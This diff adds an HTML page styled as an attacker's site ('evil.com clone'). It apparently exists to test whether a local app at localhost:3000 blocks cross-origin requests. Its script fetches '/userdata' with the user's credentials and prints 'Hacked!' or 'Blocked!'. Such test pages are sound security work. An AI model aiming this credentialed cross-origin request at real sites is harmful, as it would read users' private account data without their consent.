@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head><title>Evil Site</title></head>
+<body>
+  <h1>evil.com clone</h1>
+  <button onclick="steal()">Try to Steal Data</button>
+  <pre id="output"></pre>
+
+  <script>
+    function steal() {
+      fetch('http://localhost:3000/userdata', {
+        credentials: 'include'
+      })
+      .then(r => r.json())
+      .then(data => {
+        document.getElementById('output').textContent = 'Hacked! ' + JSON.stringify(data, null, 2);
+      })
+      .catch(err => {
+        document.getElementById('output').textContent = 'Blocked! ' + err;
+      });
+    }
+  </script>
+</body>
+</html>
